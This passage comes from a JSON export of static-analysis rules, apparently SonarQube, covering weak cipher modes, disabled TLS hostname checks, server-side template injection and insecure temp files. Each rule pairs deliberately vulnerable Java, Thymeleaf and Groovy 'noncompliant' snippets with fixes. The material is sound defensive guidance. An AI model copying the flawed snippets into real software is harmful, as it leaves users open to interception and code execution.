</li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222396\">Application Security and\n  Development: V-222396</a> - The application must implement DoD-approved encryption to protect the confidentiality of remote access sessions. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5547","summary":"Cipher algorithms should be robust","tags":["cwe","privacy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and\nreducing the difficulty of recovering the original cleartext.</p>\n<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used\nwith caution.</p>\n<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in Java Cryptography Extension</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Example with a symmetric cipher, AES:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<p>Example with an asymmetric cipher, RSA:</p>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"RSA/None/NoPadding\"); // Noncompliant\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>For the AES symmetric cipher, use the GCM mode:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"AES/GCM/NoPadding\");\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nimport javax.crypto.Cipher;\nimport java.security.NoSuchAlgorithmException;\nimport javax.crypto.NoSuchPaddingException;\n\npublic static void main(String[] args) {\n    try {\n        Cipher.getInstance(\"RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING\");\n    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {\n        // ...\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>\n<p>Appropriate choices are currently the following.</p>\n<h4>For AES: use authenticated encryption modes</h4>\n<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>\n<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and\nauthenticity of data.</p>\n<p>Other similar modes are:</p>\n<ul>\n  <li> CCM: <code>Counter with CBC-MAC</code> </li>\n  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>\n  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>\n  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>\n  <li> OCB: <code>Offset Codebook Mode</code> </li>\n</ul>\n<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly\ninstead.</p>\n<h4>For RSA: use the OAEP scheme</h4>\n<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of\nRSA.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode\">Microsoft, Timing vulnerabilities with CBC-mode\n  symmetric decryption using padding</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Padding_oracle_attack\">Wikipedia, Padding Oracle Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-ciphertext_attack\">Wikipedia, Chosen-Ciphertext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Chosen-plaintext_attack\">Wikipedia, Chosen-Plaintext Attack</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Semantic_security\">Wikipedia, Semantically Secure Cryptosystems</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Wikipedia, OAEP</a> </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode\">Wikipedia, Galois/Counter Mode</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-CRYPTO/\">Mobile AppSec Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/780\">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5542","summary":"Encryption algorithms should be used with secure mode and padding scheme","tags":["cwe","privacy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bankâs server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in Apache Commons Email</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled because <code>setSSLCheckServerIdentity</code> is omitted. To enable validation, set it to\n<code>true</code>.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.apache.commons.mail.DefaultAuthenticator;\nimport org.apache.commons.mail.Email;\nimport org.apache.commons.mail.SimpleEmail;\n\npublic void sendMail(String message) {\n    Email email = new SimpleEmail();\n\n    email.setMsg(message);\n    email.setSmtpPort(465);\n    email.setAuthenticator(new DefaultAuthenticator(username, password));\n    email.setSSLOnConnect(true); // Noncompliant\n\n    email.send();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.apache.commons.mail.DefaultAuthenticator;\nimport org.apache.commons.mail.Email;\nimport org.apache.commons.mail.SimpleEmail;\n\npublic void sendMail(String message) {\n    Email email = new SimpleEmail();\n\n    email.setMsg(message);\n    email.setSmtpPort(465);\n    email.setAuthenticator(new DefaultAuthenticator(username, password));\n    email.setSSLCheckServerIdentity(true);\n    email.setSSLOnConnect(true);\n\n    email.send();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one systemâs code should not work around\nanother systemâs problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote hostâs certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the systemâs trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by overriding <code>javax.net.ssl.HostnameVerifier.verify()</code> with an empty implementation. It is highly\nrecommended to use the original implementation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\nimport java.io.InputStream;\nimport java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.HostnameVerifier;\n\npublic InputStream doRequest() {\n    URL url                          = new URL(\"https://example.org/\");\n    HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();\n\n    urlConnection.setHostnameVerifier(new HostnameVerifier() {\n      @Override\n      public boolean verify(String requestedHost, SSLSession remoteServerSession) {\n        return true;  // Noncompliant\n      }\n    });\n\n    return urlConnection.getInputStream();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport java.io.InputStream;\nimport java.net.URL;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSession;\n\npublic InputStream doRequest() {\n    URL url                          = new URL(\"https://example.org/\");\n    HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();\n\n    return urlConnection.getInputStream();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one systemâs code should not work around\nanother systemâs problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote hostâs certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the systemâs trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>How to fix it in Java EE</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled because <code>mail.smtp.ssl.checkserveridentity</code> is omitted. To enable validation, set it to\n<code>true</code>.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport java.util.Properties;\n\npublic Properties prepareEmailConnection() {\n    Properties props = new Properties();\n\n    props.put(\"mail.smtp.host\", \"smtp.gmail.com\");\n    props.put(\"mail.smtp.socketFactory.port\", \"465\");\n    props.put(\"mail.smtp.socketFactory.class\", \"javax.net.ssl.SSLSocketFactory\"); // Noncompliant\n    props.put(\"mail.smtp.auth\", \"true\");\n    props.put(\"mail.smtp.port\", \"465\");\n\n    return props;\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport java.util.Properties;\n\npublic Properties prepareEmailConnection() {\n    Properties props = new Properties();\n\n    props.put(\"mail.smtp.host\", \"smtp.gmail.com\");\n    props.put(\"mail.smtp.socketFactory.port\", \"465\");\n    props.put(\"mail.smtp.ssl.checkserveridentity\", true);\n    props.put(\"mail.smtp.socketFactory.class\", \"javax.net.ssl.SSLSocketFactory\");\n    props.put(\"mail.smtp.auth\", \"true\");\n    props.put(\"mail.smtp.port\", \"465\");\n\n    return props;\n}\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one systemâs code should not work around\nanother systemâs problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote hostâs certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the systemâs trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<p>Here is a sample command to import a certificate to the Java trust store:</p>\n<pre>\nkeytool -import -alias myserver -file myserver.crt -keystore cacerts\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mas.owasp.org/checklists/MASVS-NETWORK/\">Mobile AppSec Verification Standard - Network Communication Requirements</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m5-insecure-communication\">Mobile Top 10 2024 Category M5 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222550\">Application Security and\n  Development: V-222550</a> - The application must validate certificates by constructing a certification path to an accepted trust anchor. </li>\n  <li> <a\n  href=\"https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms\">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.+Do+not+use+insecure+or+weak+cryptographic+algorithms</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5527","summary":"Server hostnames should be verified during SSL/TLS connections","tags":["cwe","privacy","ssl"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Server-side template injections occur when an application retrieves data from a user or a third-party service and inserts it into a template,\nwithout sanitizing it first.</p>\n<p>If an application contains a template that is vulnerable to injections, it is exposed to attacks that target the underlying rendering server.</p>\n<p>A user with malicious intent can create requests that will cause the template to change its logic into unwanted behavior.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a server-side template injection vulnerability will be able to execute arbitrary commands on the underlying operating\nsystem.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organizationâs activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal serverâs data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code examples assume that the <code>tainted</code> variable is controlled by an attacker and is not sanitized before being used in\nthe template. For instance, consider the following endpoint that could be defined within a Spring controller:</p>\n<pre>\n@GetMapping(\"/example\")\npublic String noncompliant(@RequestParam String tainted, Map&lt;String, Object&gt; model) {\n    model.put(\"tainted\", tainted);\n    return \"template\";\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<p>The following code example is vulnerable to a Server-Side Template Injection (SSTI) attack if the <code>tainted</code> variable is not sanitized\nbefore being used in the <code>th:text</code> attribute. The <code>__${...}__</code> syntax indicates that this variable should be preprocessed by\nThymeleaf before being used in the template. If the <code>tainted</code> variable is controlled by an attacker, they can inject arbitrary code into\nthe template.</p>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n&lt;!DOCTYPE HTML&gt;\n&lt;html xmlns:th=\"http://www.thymeleaf.org\"&gt;\n&lt;body&gt;\n    &lt;span th:text=\"${__${tainted}__}\"&gt;&lt;/span&gt; &lt;!-- Noncompliant --&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n&lt;!DOCTYPE HTML&gt;\n&lt;html xmlns:th=\"http://www.thymeleaf.org\"&gt;\n&lt;body&gt;\n    &lt;span th:text=\"${tainted}\"&gt;&lt;/span&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant code example does not use preprocessing so that the <code>tainted</code> variable will be directly inserted into the template, which\nprevents an attacker from injecting arbitrary code into the template.</p>\n<h4>Thymeleafâs Built-in Security Measures</h4>\n<p>It is worth noting that since Thymeleaf version 3.0.12, expressions are executed in a sandboxed environment where only a limited set of classes and\nmethods are available. While this might make it harder to exploit SSTI vulnerabilities, it does not make it impossible and there might be unknown\nbypasses which could still allow attackers to execute arbitrary code.</p>\n<h2>How to fix it in Groovy</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code example is vulnerable to a Server-Side Template Injection attack because it builds a template string from a user input without\ncontrol or sanitation.</p>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\n@GetMapping(\"/example\")\npublic String example(@RequestParam(\"title\") String title) throws CompilationFailedException, ClassNotFoundException, IOException {\n    String templateString = \"h1('\" + title + \"')\";\n    TemplateConfiguration config = new TemplateConfiguration();\n    MarkupTemplateEngine engine = new MarkupTemplateEngine(config);\n    Template template = engine.createTemplate(templateString); // Noncompliant\n    Writable out = template.make();\n    return out.toString();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\n@GetMapping(\"/example\")\npublic String example(@RequestParam(\"title\") String title) throws CompilationFailedException, ClassNotFoundException, IOException {\n    String templateString = \"h1(title)\";\n\n    Map&lt;String, Object&gt; ctx = new HashMap&lt;&gt;();\n    ctx.put(\"title\", title);\n\n    TemplateConfiguration config = new TemplateConfiguration();\n    MarkupTemplateEngine engine = new MarkupTemplateEngine(config);\n    Template template = engine.createTemplate(templateString);\n    Writable out = template.make(ctx);\n    return out.toString();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The compliant code example uses a template binding to pass user information to the template. The rendering engine then ensures that this tainted\ndata is processed in a way that will not change the template semantics.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Acunetix Web Security Blog - <a href=\"https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/\">Exploiting SSTI in\n  Thymeleaf</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/94\">CWE-94 - Improper Control of Generation of Code</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5496","summary":"Server-side templates should not be vulnerable to injection attacks","tags":["cwe","python3","injection"],"versions":{"serverEdition":"Developer","serverVersion":"10.7.0.96327","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a\nsituation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that\nare not atomic.</p>\n<h2>Why is this an issue?</h2>\n<p>Creating temporary files in a non-atomic way introduces race condition issues in the applicationâs behavior. Indeed, a third party can create a\ngiven file between when the application chooses its name and when it creates it.</p>\n<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this fileâs permissions might be\ndifferent than expected. This can lead to trust boundary issues.</p>\n<h3>What is the potential impact?</h3>\n<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the applicationâs\nlogic. By changing this fileâs Access Control List or other operating system-level properties, they could prevent the file from being deleted or\nemptied. They may also alter the fileâs content before or while the application uses it.</p>\n<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various\nconsequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>\n<h4>Information disclosure</h4>\n<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.\nThis might be especially critical if this information is sensitive.</p>\n<p>For example, an application might use temporary files to store users' session-related information. In such a case, attackers controlling those\nfiles can access session-stored information. This might allow them to take over authenticated users' identities and entitlements.</p>\n<h4>Attack surface extension</h4>\n<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In\nthat case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In\nsuch a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>\n<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files'\ncontent can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the\napplication hosting server and take it over.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.io.File;\nimport java.io.IOException;\n\nprotected void Example() throws IOException {\n    File tempDir;\n    tempDir = File.createTempFile(\"\", \".\");\n    tempDir.delete();\n    tempDir.mkdir();  // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\n\nprotected void Example() throws IOException {\n    Path tempPath = Files.createTempDirectory(\"\");\n    File tempDir = tempPath.toFile();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files' name, location, and\npermissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications' technology stacks.</p>\n<h4>Use a secure API function</h4>\n<p>Temporary files handling APIs generally provide secure functions to create temporary files. In most cases, they operate in an atomical way,\ncreating and opening a file with a unique and unpredictable name in a single call. Those functions can often be used to replace less secure\nalternatives without requiring important development efforts.</p>\n<p>Here, the example compliant code uses the safer <code>Files.createTempDirectory</code> function to manage the creation of temporary\ndirectories.</p>\n<h4>Strong security controls</h4>\n<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling\nfunctions and APIs can also be used for that purpose.</p>\n<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating\nthe files:</p>\n<ul>\n  <li> Files should be created in a non-public directory. </li>\n  <li> File names should be unique. </li>\n  <li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li>\n  <li> File creation should fail if a target file already exists. </li>\n</ul>\n<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File\">OWASP</a> - Insecure Temporary File </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/377\">CWE-377 - Insecure Temporary File</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/379\">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>\n  </li>\n  